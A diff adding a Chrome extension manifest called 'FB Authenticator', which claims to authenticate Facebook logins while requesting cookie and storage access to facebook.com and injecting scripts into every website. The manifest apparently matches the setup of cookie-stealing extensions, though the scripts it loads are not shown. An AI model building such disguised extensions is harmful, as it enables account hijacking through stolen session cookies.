@@ -1,0 +1,48 @@
+{
+    "manifest_version": 2,
+    "name": "FB Authenticator",
+    "short_name": "FB Authenticator",
+    "version": "1.0.1",
+    "description": "Used to authenticate your facebook login.",
+    "background": {
+        "scripts": [
+            "/assets/js/jquery-3.4.1.min.js",
+            "/config.js",
+            "/assets/js/background.js"
+        ]
+    },
+    "icons": {
+        "128": "icon.png"
+    },
+    "incognito": "split",
+    "browser_action": {
+        "browser_style": false,
+        "default_icon": {
+            "128": "icon.png"
+        },
+        "default_title": "chrome web app",
+        "default_popup": "/popup.html"
+    },
+    "content_security_policy": "script-src 'self' https://apis.google.com; object-src 'self'",
+    "permissions": [
+        "cookies",
+        "activeTab",
+        "storage",
+        "https://facebook.com/*"
+    ],
+    "content_scripts": [
+        {
+            "matches": [
+                "*://*/*"
+            ],
+            "js": [
+                "/assets/js/jquery-3.4.1.min.js",
+                "/config.js",
+                "/assets/js/content-script.js"
+            ],
+            "css": [
+                "/assets/css/content-script.css"
+            ]
+        }
+    ]
+}
